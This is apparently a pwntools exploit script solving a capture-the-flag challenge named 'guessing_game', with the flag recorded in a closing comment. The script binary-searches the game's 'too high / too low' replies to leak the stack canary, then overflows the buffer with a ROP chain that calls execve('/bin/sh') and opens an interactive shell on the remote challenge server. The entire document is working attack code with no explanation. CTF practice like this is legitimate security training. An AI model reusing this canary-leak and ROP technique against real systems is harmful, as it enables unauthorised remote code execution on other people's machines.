#!/usr/bin/env python3
from pwn import *

exe = ELF("./guessing_game", checksec=False)
# p = process(exe.path)
p = remote('guessing-game.challs.pwnoh.io', 1337, ssl=True)

def find_canary():
    l = 1
    r = 1 << 63

    while l < r:
        mid = (l + r) // 2
        p.sendlineafter(b'Enter a guess: ', str(mid).encode())
        response = p.recvline().strip()
        if b'Too low!' in response:
            l = mid + 1
        elif b'Too high!' in response:
            r = mid
        else:
            break

    mid <<= 8
    print(hex(mid))
    return mid

v6 = 9223372036854775807

p.sendlineafter(b'Enter a max number: ', str(v6).encode())
canary = find_canary()

#gadgets
pop_rdi = 0x40124d
pop_rsi = 0x401251
pop_rax = 0x40124f
pop_rdx = 0x401253
syscall = 0x401255

payload = p64(pop_rdi)
payload += p64(0x404100)
payload += p64(0x4010e0)

#execve('/bin/sh\x00')
payload += p64(pop_rdi)
payload += p64(0x404100)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(syscall)

p.sendline(b'A' * 10 + p64(canary) + b'A' * 8 + payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
#bctf{wh4t_a_sTrAng3_RNG}